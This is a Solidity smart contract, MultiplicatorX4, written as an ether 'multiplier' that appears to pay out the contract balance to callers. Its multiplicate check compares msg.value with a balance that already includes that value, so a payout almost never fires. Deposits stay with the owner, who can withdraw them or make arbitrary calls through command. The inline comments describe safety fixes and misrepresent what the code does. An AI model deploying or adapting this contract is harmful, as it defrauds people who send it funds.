pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data)); // Check the return value of the low level call
    }

    function multiplicate(address adr) public payable {
        if (msg.value >= this.balance) {
            require(adr.send(this.balance + msg.value)); // Use send instead of transfer to handle failure gracefully
        }
    }
}